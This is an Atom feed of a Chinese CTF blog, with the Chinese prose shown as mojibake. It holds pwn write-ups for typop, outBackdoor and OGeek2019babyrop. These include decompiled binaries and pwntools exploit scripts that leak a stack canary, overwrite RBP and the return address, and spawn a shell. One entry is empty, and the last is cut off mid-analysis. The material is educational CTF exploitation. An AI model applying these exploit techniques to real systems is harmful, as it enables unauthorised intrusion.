<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>EUREKA!</title>
  
  
  <link href="https://www.fomal.cc/atom.xml" rel="self"/>
  
  <link href="https://www.fomal.cc/"/>
  <updated>2023-04-02T03:03:02.004Z</updated>
  <id>https://www.fomal.cc/</id>
  
  <author>
    <name>EUREKAğŸŠ</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>typop Write Up</title>
    <link href="https://www.fomal.cc/posts/28066d78.html"/>
    <id>https://www.fomal.cc/posts/28066d78.html</id>
    <published>2023-04-02T03:02:22.722Z</published>
    <updated>2023-04-02T03:03:02.004Z</updated>
    
    <content type="html"><![CDATA[<p>å‰è¨€,æœ¬é¢˜ä½¿ç”¨äº†fake frameæ‰‹æ³•</p><h2 id="1-æºä»£ç ">1.æºä»£ç </h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">getFeedback</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 buf; <span class="comment">// [rsp+Eh] [rbp-12h] BYREF</span></span><br><span class="line">  __int16 v2; <span class="comment">// [rsp+16h] [rbp-Ah]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  buf = <span class="number">0LL</span>;</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Do you like ctf?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">30uLL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;You said: %s\n&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)&amp;buf);</span><br><span class="line">  <span class="keyword">if</span> ( (_BYTE)buf == <span class="number">121</span> )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;That&#x27;s great! &quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Aww :( &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Can you provide some extra feedback?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x5A</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">win</span><span class="params">(<span class="type">char</span> a1, <span class="type">char</span> a2, <span class="type">char</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+18h] [rbp-58h]</span></span><br><span class="line">  _BYTE filename[<span class="number">10</span>]; <span class="comment">// [rsp+26h] [rbp-4Ah] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">8</span>]; <span class="comment">// [rsp+30h] [rbp-40h] BYREF</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+38h] [rbp-38h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+40h] [rbp-30h]</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+48h] [rbp-28h]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+50h] [rbp-20h]</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+58h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v12; <span class="comment">// [rsp+68h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v12 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  filename[<span class="number">9</span>] = <span class="number">0</span>;</span><br><span class="line">  filename[<span class="number">0</span>] = a1;</span><br><span class="line">  filename[<span class="number">1</span>] = a2;</span><br><span class="line">  filename[<span class="number">2</span>] = a3;</span><br><span class="line">  <span class="built_in">strcpy</span>(&amp;filename[<span class="number">3</span>], <span class="string">&quot;g.txt&quot;</span>);</span><br><span class="line">  stream = fopen(filename, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Error opening flag file.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  *(_QWORD *)s = <span class="number">0LL</span>;</span><br><span class="line">  v7 = <span class="number">0LL</span>;</span><br><span class="line">  v8 = <span class="number">0LL</span>;</span><br><span class="line">  v9 = <span class="number">0LL</span>;</span><br><span class="line">  v10 = <span class="number">0LL</span>;</span><br><span class="line">  v11 = <span class="number">0LL</span>;</span><br><span class="line">  fgets(s, <span class="number">32</span>, stream);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v12;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="built_in">puts</span>(<span class="string">&quot;Do you want to complete a survey?&quot;</span>) &amp;&amp; getchar() == <span class="number">121</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    getchar();</span><br><span class="line">    getFeedback();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-åˆ†ææ¼æ´">2. åˆ†ææ¼æ´</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>â€‹é˜²æŠ¤å…¨å¼€,ç”¨IDAåç¼–è¯‘å‘ç°æœ‰åé—¨å‡½æ•°å¹¶ä¸”æœ‰å¯ä»¥å¾ªç¯è°ƒç”¨çš„getfeedbackå‡½æ•°,ä½†æ˜¯åé—¨å‡½æ•°é‡Œé¢æ‰“å¼€flagçš„æ–‡ä»¶åä¸å®Œæ•´,ä½†æ˜¯é™„ä»¶æ²¡ç»™libcè€Œä¸”gadgetsä¹Ÿä¸å¤Ÿå¸ƒç½®å®Œæ•´çš„ROPæ¥æŠŠå‰ä¸‰ä¸ªå­—ç¬¦ä¼ è¿›filename.ä¸è¿‡ç”±äºgetfeedback()å’Œwin()åˆ†åˆ«æœ‰bufå’Œfilenameä¸¤ä¸ªæœ¬åœ°å˜é‡,è€Œåœ¨å‡½æ•°çš„æ ˆå¸§ä¸­é€šå¸¸ç”¨RBPæ¥è®¿é—®å˜é‡,é‚£ä¹ˆå°±å¯ä»¥ä¿®æ”¹getfeedback()çš„RBPæŒ‡å‘çš„åœ°å€å’Œ]RBP+8],å³è¿”å›åœ°å€.</p><p>â€‹é‚£ä¹ˆç°åœ¨çš„æ€è·¯å·²ç»åŸºæœ¬æœ‰äº†:</p><p>â€‹ç¬¬ä¸€æ¬¡è°ƒç”¨getfeedback(),åœ¨ç¬¬ä¸€æ¬¡è¾“å…¥æ—¶è¦†ç›–canaryä½ä½ä¸Šçš„\x00,å› ä¸ºcanaryä¸€èˆ¬å’Œæ ˆåº•è·ç¦»ä¸€ä¸ªæœºå™¨å­—é•¿,æ‰€ä»¥ä¼šé¡ºå¸¦ç€æŠŠprevious RBPä¹Ÿç»™æ‰“å°å‡ºæ¥,è¿™æ˜¯ä¸€ä¸ªæ ˆä¸Šçš„åœ°å€,æ ¹æ®æœ¬åœ°è°ƒè¯•å°±å¯ä»¥è®¡ç®—å‡ºæ ˆåŸºåœ°å€æ¥è¦†ç›–RBP,getfeedback()ç¬¬ä¸€æ¬¡è¾“å…¥åªèƒ½æ³„éœ²æ ˆå’Œcanary,ä¸è¿‡æœ‰ç¬¬äºŒæ¬¡çš„è¾“å…¥å¯ä»¥è¡¥å›canaryçš„å€¼é˜²æ­¢å´©æºƒ,æ‰€ä»¥ç¬¬äºŒæ¬¡è¾“å…¥æŠŠcanaryè¿˜åŸæ¥è¿›è¡Œä¸‹ä¸€æ¬¡è°ƒç”¨getfeedback();</p><p>â€‹ç¬¬äºŒæ¬¡è°ƒç”¨getfeedback(),è®¡ç®—å¥½åç§»é‡æŠŠ[RBP+8]ç»™æ‰“å°å‡ºæ¥,é€šè¿‡IDAé‡Œé¢åç§»åœ°å€è®¡ç®—å‡ºåŸºåœ°å€,å†æ ¹æ®éœ€è¦ç®—å‡ºè¦æ§åˆ¶çš„RBPåœ°å€,è€æ ·å­ç¬¬äºŒæ¬¡è¾“å…¥è¡¥å…¨canary;</p><p>â€‹ç¬¬ä¸‰æ¬¡è°ƒç”¨getfeedback(),ç”±äºROPé“¾çš„gadgetä¸å…¨,æ‰€ä»¥åº”è¯¥æ˜¯åœ¨åŸå…ˆgetfeedback()çš„bufä¸Šè¾“å…¥filename,ä¹Ÿå°±æ˜¯flag.txt\x00,å†é€šè¿‡æ ˆæº¢å‡ºæ“æ§RBPå’ŒRIPæŠŠflag.txt\x00å½“ä½œæ˜¯filename()æ‰“å¼€,å› æ­¤è¦†ç›–ç”¨çš„è¿”å›åœ°å€ä½¿ç”¨çš„win()é‡Œé¢è°ƒç”¨fopen()çš„èµ·å§‹åœ°å€,è€Œè¦è¦†ç›–çš„RBPåœ°å€å°±æ¯”è¾ƒéšä¾¿,ç»è¿‡äº†ç®€å•çš„è°ƒè¯•,å‘ç°å¦‚æœæŠŠRBPè·³è½¬åˆ°å¯ä»¥æŠŠbufåˆšå¥½å½“ä½œfilenameè¯»å…¥çš„æ—¶å€™,ä¹Ÿå°±æ˜¯ä¸‹é¢çš„expé‡Œæœ€åä¸€ä¸ªpayloadçš„å‰é¢10å­—èŠ‚,å½“RBPè¢«è®¾ç½®æˆè¿™10ä¸ªå­—èŠ‚é™„è¿‘åŒºåŸŸè¯»å–filenameæ—¶ä¼šå‡ºç°è¯»å–å¤±è´¥,å³ä½¿flag.txt\x00å·²ç»è¢«ä¼ å…¥RDI,fopen()ä¾ç„¶ä¼šè°ƒç”¨å¤±è´¥,æœ€åç¨å¾®è°ƒè¯•ä¸€ä¸‹æŠŠRBPè®¾ç½®æˆè¯»å–æ›´é«˜ä¸€äº›åœ°å€çš„åŒºåŸŸä½œä¸ºfilenameæ—¶,flagè¢«æˆåŠŸè¯»å–.</p><h2 id="3-exp">3.exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=process(<span class="string">&#x27;./typop&#x27;</span>)</span><br><span class="line">gdb.attach(io,<span class="string">&#x27;b main&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#æ³„éœ²canaryå’Œæ ˆåœ°å€</span></span><br><span class="line">pause(<span class="number">1</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Do you want to complete a survey?&#x27;</span>, <span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">payload = <span class="number">10</span>*<span class="string">b&#x27;y&#x27;</span></span><br><span class="line">pause(<span class="number">1</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Do you like ctf?&#x27;</span>, payload)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;y&#x27;</span>*<span class="number">10</span>)</span><br><span class="line">canary = u64(io.recv(<span class="number">8</span>))-<span class="number">0xa</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line">stack = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x10</span>+<span class="number">0x38</span> <span class="comment">#å‡å»0x10è®©RBPæŒ‡å‘çš„åœ°å€å­˜æ”¾è‡ªå·±çš„åœ°å€,åŠ ä¸Š0x38è®©RBPè¯»å–çš„filenameå’Œbufå¯¹é½,ä¸è¿‡è¿™æ ·æ”¹ä¼šæ‰“ä¸å¼€æ–‡ä»¶,æ‰€ä»¥åé¢å†åŠ äº†åç§»</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack))</span><br><span class="line">payload = <span class="number">10</span>*<span class="string">b&#x27;y&#x27;</span>+p64(canary)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Can you provide some extra feedback?&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#æ³„éœ²ç¨‹åºåŠ è½½åŸºåœ°å€</span></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Do you want to complete a survey?&#x27;</span>, <span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Do you like ctf?&#x27;</span>, <span class="number">0x1a</span>*<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="number">0x1a</span>*<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x447</span>+<span class="number">0x298</span>+<span class="number">0x51</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#ä¿®æ”¹RBPè¯»å…¥æ–‡ä»¶å,è·å–flag</span></span><br><span class="line">payload = <span class="number">10</span>*<span class="string">b&#x27;y&#x27;</span>+p64(canary)+p64(stack+<span class="number">0x22</span>)+p64(addr)+<span class="string">b&#x27;flag.txt\x00&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">åœ¨flag.txt\x00å‰é¢æœ‰0x22å­—èŠ‚æ•°æ®,stack+0x22åˆšå¥½å¯ä»¥è®©flag.txt\x00è¡”æ¥åœ¨payloadåé¢</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">io.sendafter(<span class="string">&#x27;Can you provide some extra feedback?&#x27;</span>, payload)</span><br><span class="line">io.recvline()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;å‰è¨€,æœ¬é¢˜ä½¿ç”¨äº†fake frameæ‰‹æ³•&lt;/p&gt;
&lt;h2 id=&quot;1-æºä»£ç &quot;&gt;1.æºä»£ç &lt;/h2&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/s</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>sh_v1.1 WP</title>
    <link href="https://www.fomal.cc/posts/456d7704.html"/>
    <id>https://www.fomal.cc/posts/456d7704.html</id>
    <published>2023-04-02T03:02:22.720Z</published>
    <updated>2023-04-02T03:03:02.004Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-ä¼ªä»£ç ">1.ä¼ªä»£ç </h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-ä¼ªä»£ç &quot;&gt;1.ä¼ªä»£ç &lt;/h2&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>outBackdoor Write Up</title>
    <link href="https://www.fomal.cc/posts/d5134afd.html"/>
    <id>https://www.fomal.cc/posts/d5134afd.html</id>
    <published>2023-04-02T03:02:22.719Z</published>
    <updated>2023-04-02T03:03:02.004Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-åˆ†æ">1.åˆ†æ</h2><p>æ‹¿åˆ°é¢˜ç›®å…ˆç”¨checksecæ£€æŸ¥å‘ç°æ²¡æœ‰å¼€å¯canaryä¿æŠ¤,ç”¨IDA64åˆ†æå‘ç°<code>gets(v4)</code>æœ‰æ ˆæº¢å‡ºçš„æ¼æ´å¯ä»¥åˆ©ç”¨,åˆå‘ç°æœ‰ç›´æ¥è¿”å›shellçš„outBackdoorå‡½æ•°.<br>ç›´æ¥æ‰§è¡Œç¨‹åºå‘ç°æƒé™ä¸è¶³,ä½¿ç”¨<code>chmod 755 outBackdoor</code>æ¥ææƒ<br>ç”¨cyclicç”Ÿæˆä¸€ä¸²å¤§äº16çš„å­—ç¬¦ä¸²å¤åˆ¶ä¸‹æ¥<br><code>cyclic 32 aaaabaaacaaadaaaeaaafaaagaaahaaa</code><br>å¯¹æ–‡ä»¶gdbè°ƒè¯•,è¾“å…¥å­—ç¬¦ä¸²,å‡ºç°æ ˆæº¢å‡º<br><code>*RSP  0x7fffffffdd78 â—‚â€” 'gaaahaaa'</code><br>ç»è¿‡è®¡ç®—å‘ç°æ˜¯åœ¨å‰24ä¸ªå­—ç¬¦æ—¶çš„ä½ç½®å‡ºç°,<br>æ‰€ä»¥éœ€è¦åœ¨è¿™ä¸ªä½ç½®è¦†ç›–ä¸Šè¿”å›shellçš„å‡½æ•°åœ°å€.</p><h2 id="2-exploitation">2.exploitation</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&#x27;ip&#x27;</span>,&lt;port&gt;)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>+p64(<span class="number">0x4011D7</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>å‘ç°æ²¡æœ‰æˆåŠŸè¿”å›shell,ä¸Šç½‘æŸ¥æ‰¾å‘ç°è²Œä¼¼å’Œsystemå‡½æ•°æœ‰å…³,æ›´æ¢åœ°å€ä¸ºåé—¨å‡½æ•°åœ°å€çš„ä¸‹ä¸€ä¸ªåœ°å€<code>0x4011D8</code>æˆåŠŸè·³è½¬åˆ°å‡½æ•°,è¿”å›shell.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">W...w...Wait? Who put this backdoor out back here?</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">bin</span><br><span class="line">dev</span><br><span class="line">flag</span><br><span class="line">lib</span><br><span class="line">lib32</span><br><span class="line">lib64</span><br><span class="line">libc-2.27.so</span><br><span class="line">outBackdoor</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-åˆ†æ&quot;&gt;1.åˆ†æ&lt;/h2&gt;
&lt;p&gt;æ‹¿åˆ°é¢˜ç›®å…ˆç”¨checksecæ£€æŸ¥å‘ç°æ²¡æœ‰å¼€å¯canaryä¿æŠ¤,ç”¨IDA64åˆ†æå‘ç°&lt;code&gt;gets(v4)&lt;/code&gt;æœ‰æ ˆæº¢å‡ºçš„æ¼æ´å¯ä»¥åˆ©ç”¨,åˆå‘ç°æœ‰ç›´æ¥è¿”å›shellçš„outBackdoorå‡½æ•°.&lt;br&gt;
ç›´æ¥æ‰§è¡Œç¨‹åº</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>OGeek2019babyrop 1</title>
    <link href="https://www.fomal.cc/posts/875b5e79.html"/>
    <id>https://www.fomal.cc/posts/875b5e79.html</id>
    <published>2023-04-02T03:02:22.717Z</published>
    <updated>2023-04-02T03:03:01.998Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-ä¼ªä»£ç ">1.ä¼ªä»£ç </h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">process</span><span class="params">(<span class="type">int</span> privous_buf)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">32</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">32</span>]; <span class="comment">// [esp+2Ch] [ebp-2Ch] BYREF</span></span><br><span class="line">  <span class="type">ssize_t</span> sucLen; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  <span class="built_in">sprintf</span>(s, <span class="string">&quot;%ld&quot;</span>, privous_buf);               <span class="comment">// print the random integer into s</span></span><br><span class="line">  sucLen = read(<span class="number">0</span>, buf, <span class="number">0x20</span>u);                 <span class="comment">// guess the random ,but this is the cve</span></span><br><span class="line">  buf[sucLen - <span class="number">1</span>] = <span class="number">0</span>;                          <span class="comment">// &#x27;\x00&#x27;</span></span><br><span class="line">  v1 = <span class="built_in">strlen</span>(buf);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(buf, s, v1) )                    <span class="comment">// compare NULL and the random integer</span></span><br><span class="line">                                                <span class="comment">// definitely the return is True and execute exit()</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Correct\n&quot;</span>, <span class="number">8u</span>);                    <span class="comment">// if not ,this is the notice</span></span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> __int8)buf[<span class="number">7</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">ssize_t</span> __cdecl <span class="title function_">process2</span><span class="params">(<span class="type">char</span> buf7)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">231</span>]; <span class="comment">// [esp+11h] [ebp-E7h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( buf7 == <span class="number">127</span> )</span><br><span class="line">    <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">200u</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> read(<span class="number">0</span>, buf, buf7);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> buf; <span class="comment">// [esp+4h] [ebp-14h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v2; <span class="comment">// [esp+Bh] [ebp-Dh]</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  initialization();</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fd &gt; <span class="number">0</span> )</span><br><span class="line">    read(fd, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">  v2 = process1(buf);                           <span class="comment">// give buf a random value</span></span><br><span class="line">  process2(v2);                                 <span class="comment">// v2 is the process&#x27;s buf[7]</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-æ¼æ´åˆ†æ">2.æ¼æ´åˆ†æ</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ç¨‹åºæ²¡æœ‰å¼€å¯PIEé˜²æŠ¤,é‚£ä¹ˆå°±å¯ä»¥ç”¨å¸¸è§çš„ret2libcæ‰‹æ³•æ¥è§£å†³é—®é¢˜äº†.</p><p>ç¨‹åºçš„æ‰§è¡Œæµå’Œæ”»å‡»æ‰‹æ®µå¤§æ¦‚è§£é‡Šä¸€ä¸‹,å…ˆç”Ÿæˆä¸€ä¸ªéšæœºæ•°,å°†å››ä½éšæœºæ•°ä¼ å…¥åˆ°<code>process1()</code>,åœ¨p1å‡½æ•°é‡Œé¢æœ‰ä¸€ä¸ªåˆ†æ”¯,è¦è¾“å…¥ä¸€ä¸ªæ•°å­—æ¥å’Œéšæœºæ•°æ¯”è¾ƒ,ä¸åŒåˆ™ç»“æŸ,ç›¸åŒåˆ™ç»§ç»­,è¿™é‡Œéœ€è¦çŸ¥é“çš„æ˜¯<code>strcmp()</code>å¦‚æœå…¶ä¸­ä¸€ä¸ªå­—ç¬¦ä¸²è¯»å–åˆ°<code>'\0'</code>çš„æ—¶å€™å°±ä¼šç»“æŸ.å½“p1å‡½æ•°ç»“æŸçš„æ—¶å€™å°†ä¼šè¿”å›<code>buf[7]</code>åˆ°<code>process2()</code>æ¥è¿›è¡Œä¸‹ä¸€ä¸ªåˆ†æ”¯åˆ¤æ–­,è¿™é‡Œæ‰“å¼€ç‚¹æ€è·¯,åœ¨<code>buf[0]</code>å°±ä¼ å…¥<code>'\0'</code>ç„¶åæŠŠæˆ‘ä»¬éœ€è¦çš„æ•°å­—ä¼ 